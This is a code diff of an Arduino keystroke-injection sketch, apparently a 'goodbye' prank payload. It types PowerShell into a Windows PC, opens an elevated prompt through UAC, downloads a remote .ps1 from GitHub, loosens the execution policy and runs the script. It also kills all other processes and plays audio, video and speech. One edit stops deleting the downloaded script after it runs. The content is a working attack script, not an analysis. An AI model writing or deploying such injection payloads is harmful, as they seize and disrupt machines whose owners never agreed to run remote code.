@@ -101,7 +101,6 @@ void shut_down(){
 const String key_right_command = "Get-Process | Where-Object {$_.Name -ne 'powershell' -And $_.Name -ne 'conhost'} | Stop-Process -Name {$_.Name}";
 const String l_pad = "#####     ";
 const String r_pad = "     #####";
-const String powershell_exec = "Powershell (Join-Path $home 'Desktop\\";
 
 void powershell_init_uac(int d=350){
   Keyboard.press(KEY_LEFT_GUI);
@@ -134,6 +133,7 @@ void set_execution_policy(){
 }
 void download(){
   powershell_init_uac();
+  delay(1000);
   Keyboard.println("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
   Keyboard.println("$u = 'https://github.com/IncompleteInformation/goodbye/raw/master/scripts/download.ps1'");                     //"$u = 'url'"
   Keyboard.println("$p = 'C:\\Users\\Public\\Documents\\download.ps1'");
@@ -141,7 +141,6 @@ void download(){
   Keyboard.println("$w.DownloadFile($u, $p)");
   set_execution_policy();
   Keyboard.println("Powershell $p");
-  Keyboard.println("Remove-Item $p");
 }
 
 
@@ -180,6 +179,7 @@ void task_manager_loop(){
 
 void speak(String words, int rate = 0){
   alt_tab();
+  delay(500);
   Keyboard.print("$s.Rate = ");
   Keyboard.println(rate);
   Keyboard.print("$s.SpeakAsync(\'");
@@ -242,6 +242,7 @@ void select_all(){
 }
 void start_music(){
   powershell_init();
+  delay(1000);
   Keyboard.println("Add-Type -AssemblyName presentationCore");
   Keyboard.println("$mp = New-Object system.windows.media.mediaplayer");
   Keyboard.println("$mp.open('C:\\Users\\Public\\Documents\\goodbye\\goodbye.mp3')");
@@ -253,7 +254,8 @@ void start_music(){
 }
 void start_video(){
   powershell_init();
-  Keyboard.print(powershell_exec);Keyboard.println("goodbye\\video.ps1')");
+  delay(1000);
+  Keyboard.println("Powershell C:\\Users\\Public\\Documents\\goodbye\\video.ps1");
   delay(100);
 }
 void goodbye_loop(){
